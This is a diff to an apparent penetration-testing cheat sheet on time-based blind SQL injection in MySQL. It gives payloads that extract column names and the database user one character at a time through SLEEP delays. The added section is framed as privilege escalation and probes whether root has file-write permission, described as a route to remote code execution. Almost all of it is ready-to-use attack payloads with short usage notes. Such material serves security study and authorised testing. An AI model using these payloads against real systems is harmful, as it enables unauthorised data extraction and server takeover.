@@ -104,6 +104,8 @@ To search for the third character of the first column, you should increate the f
 and if((select mid(column_name,1,1) from table_name limit 2,1)='a',sleep(5),1)--
 ```
 
+# Privilege escalation
+
 ## Finding the db user
 Find the first character of the user (if guessed then the request will be 5 seconds delayed):
 ```sql
@@ -113,4 +115,11 @@ and if(substring(user(),1,1)='a',SLEEP(5),1)--
 Find the second character of the user... and so on:
 ```sql
 and if(substring(user(),2,1)='d',SLEEP(5),1)--
+```
+
+## Enumerate user's permission
+
+The following query will show if the user we found from the previous step, has writing permission, which can lead to RCE:  
+```sql
+AND if (MID((SELECT file_priv FROM mysql.user WHERE user = 'root'),1,1) = 'Y', sleep(10), null)--
 ```
